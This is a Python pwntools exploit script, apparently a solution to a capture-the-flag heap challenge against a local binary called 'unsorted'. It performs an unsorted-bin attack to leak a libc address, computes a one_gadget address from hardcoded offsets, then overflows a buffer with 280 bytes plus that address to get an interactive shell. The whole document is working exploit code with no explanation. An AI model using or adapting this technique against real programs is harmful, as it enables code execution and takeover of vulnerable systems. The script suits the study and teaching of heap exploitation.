#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./unsorted")
elf = ELF("./unsorted")
name = elf.symbols['name']

def add(data):
    p.sendlineafter("> ", '1')
    p.sendafter("Data: ", data)

def free(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))

def edit(idx, data):
    p.sendlineafter("> ", '3')
    p.sendlineafter("idx: ", str(idx))
    p.sendafter("data: ", data)

def print_name():
    p.sendlineafter("> ", '4')

def overflow(data):
    p.sendlineafter("> ", '5')
    p.send(data)

add('A'*8)
add('B'*8)

free(0)
edit(0, 'A'*8 + p64(name-0x10))

add('C'*8)

print_name()
p.recvuntil("Name: ")
leak = u64(p.recvuntil("\x7f") + '\x00\x00')
log.info("leak: "+hex(leak))
libcbase = leak - 0x3c4b78
one_gadget = libcbase + 0x45216

#gdb.attach(p)
overflow('A'*280 + p64(one_gadget))

p.interactive()

